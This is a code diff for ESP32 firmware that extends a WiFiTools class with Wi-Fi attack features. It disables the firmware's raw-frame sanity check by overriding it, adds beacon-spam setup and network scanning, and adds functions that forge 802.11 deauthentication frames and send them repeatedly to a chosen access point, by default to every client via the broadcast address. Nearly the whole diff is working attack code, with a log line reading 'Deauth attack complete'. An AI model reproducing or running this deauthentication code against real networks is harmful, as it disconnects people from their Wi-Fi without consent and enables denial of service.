@@ -13,12 +13,17 @@ esp_err_t esp_wifi_set_mode(wifi_mode_t mode);
 esp_err_t esp_wifi_start();
 esp_err_t esp_wifi_set_promiscuous(bool en);
 
+// Overwrite the function to prevent the sanity check from returning an error allowing the raw frame to be sent
+extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
+    return 0;
+}
+
 // Constructor
 WiFiTools::WiFiTools() {
     // Empty constructor
 }
 
-void WiFiTools::begin() {
+void WiFiTools::beaconSpamSetup() {
     // Initialize esp_wifi
     esp_err_t err = esp_wifi_init(&cfg);
     if (err != ESP_OK) {
@@ -80,6 +85,8 @@ void WiFiTools::generateRandomMac() {
 }
 
 void WiFiTools::rickRollBeaconSpam() {
+    beaconSpamSetup();
+
     Serial.println("Starting rickRollBeaconSpam");
 
     // Stop current WiFi connection and transition to AP mode
@@ -162,4 +169,127 @@ void WiFiTools::rickRollBeaconSpam() {
     }
 
     Serial.println("Finished rickRollBeaconSpam");
+
+    // Stop WiFi
+    WiFi.mode(WIFI_OFF);
+    Serial.println("WiFi stopped");
+}
+
+void WiFiTools::scanWiFiNetworks() {
+    // Get a list of available networks displaying their SSID, MAC address and channel
+    int numNetworks = WiFi.scanNetworks();
+    Serial.printf("Found %d networks\n", numNetworks);
+    for (int i = 0; i < numNetworks; i++) {
+        Serial.printf("Network %d: %s, MAC: %s, Channel: %d\n", i, WiFi.SSID(i).c_str(), WiFi.BSSIDstr(i).c_str(), WiFi.channel(i));
+        wifi_ap_record_t ap;
+        ap.rssi = WiFi.RSSI(i);
+        ap.authmode = WiFi.encryptionType(i);
+        ap.primary = WiFi.channel(i);
+        memcpy(ap.bssid, WiFi.BSSID(i), 6);
+        memcpy(ap.ssid, WiFi.SSID(i).c_str(), 32);
+        foundWiFiNetworks.push_back(ap);
+    }
+}
+
+std::vector<wifi_ap_record_t> WiFiTools::getAvailableNetworks() {
+    return foundWiFiNetworks;
+}
+
+void WiFiTools::clearFoundWiFiNetworks() {
+    foundWiFiNetworks.clear();
+}
+
+void WiFiTools::sendDeauthPacket(uint8_t* apMac, uint8_t* stMac, uint8_t channel, uint8_t reasonCode) {
+    // build the deauth packet
+    uint16_t deauthPacketSize = sizeof(deauthPacket);
+    uint8_t deauthPacketToTransmit[deauthPacketSize];
+    memcpy(deauthPacketToTransmit, deauthPacket, deauthPacketSize);
+
+    memcpy(&deauthPacketToTransmit[4], stMac, 6);
+    memcpy(&deauthPacketToTransmit[10], apMac, 6);
+    memcpy(&deauthPacketToTransmit[16], apMac, 6);
+    deauthPacketToTransmit[24] = reasonCode;
+
+    // send the deauth packet
+    deauthPacketToTransmit[0] = 0xC0;
+
+    // set channel
+    esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+    if (err != ESP_OK) {
+        Serial.printf("Failed to set channel: %d\n", err);
+        return;
+    }
+
+    // Ensure WiFi interface is set to AP mode
+    err = esp_wifi_set_mode(WIFI_MODE_AP);
+    if (err != ESP_OK) {
+        Serial.printf("Failed to set WiFi mode: %d\n", err);
+        Serial.printf("Error: %s\n", esp_err_to_name(err));
+        return;
+    }
+
+    // Set WiFi to promiscuous mode
+    err = esp_wifi_set_promiscuous(true);
+    if (err != ESP_OK) {
+        Serial.printf("Failed to set WiFi to promiscuous mode: %d\n", err);
+        Serial.printf("Error: %s\n", esp_err_to_name(err));
+        return;
+    }
+
+    err = esp_wifi_80211_tx(WIFI_IF_AP, deauthPacketToTransmit, deauthPacketSize, false);
+    if (err != ESP_OK) {
+        Serial.printf("Failed to send deauth: %d\n", err);
+        Serial.printf("Error: %s\n", esp_err_to_name(err));
+    } else {
+        Serial.println("Deauth sent successfully");
+    }
+}
+
+void WiFiTools::deauthNetwork(uint8_t* networkSSID = NULL, uint8_t* networkBSSID = NULL, uint8_t channel = NULL, int availableNetworkIndex = -1, uint8_t* targetMacAddr = NULL, int numPackets = 1, int delayMs = 100, uint8_t reasonCode = 2) {
+    uint8_t apMac[6];
+    uint8_t stMac[6];
+    uint8_t targetMac[6];
+
+    // Check if networkSSID, networkBSSID, and channel are provided
+    if (networkSSID != NULL && networkBSSID != NULL && channel != NULL) {
+        // Set the variables for the deauth packet
+        memcpy(apMac, networkBSSID, 6);
+
+        // Set the target MAC address
+        if (targetMacAddr != NULL) {
+            memcpy(targetMac, targetMacAddr, 6);
+        } else {
+            // Set the target MAC address to broadcast
+            memset(targetMac, 0xFF, 6);
+        }
+    } else if (availableNetworkIndex >= 0 && availableNetworkIndex < foundWiFiNetworks.size()) {
+        // Set the variables for the deauth packet
+        memcpy(apMac, foundWiFiNetworks[availableNetworkIndex].bssid, 6);
+
+        // Set the target MAC address
+        if (targetMacAddr != NULL) {
+            memcpy(targetMac, targetMacAddr, 6);
+        } else {
+            // Set the target MAC address to broadcast
+            memset(targetMac, 0xFF, 6);
+        }
+
+        // Set the channel
+        channel = foundWiFiNetworks[availableNetworkIndex].primary;
+    } else {
+        Serial.println("Error: Network information not provided");
+        return;
+    }
+
+    for (int i = 0; i < numPackets; i++) {
+        // Send the deauth packet
+        sendDeauthPacket(apMac, targetMac, channel, reasonCode);
+        delay(delayMs);
+    }
+
+    Serial.println("Deauth attack complete");
+
+    // Stop WiFi
+    WiFi.mode(WIFI_OFF);
+    Serial.println("WiFi stopped");
 }
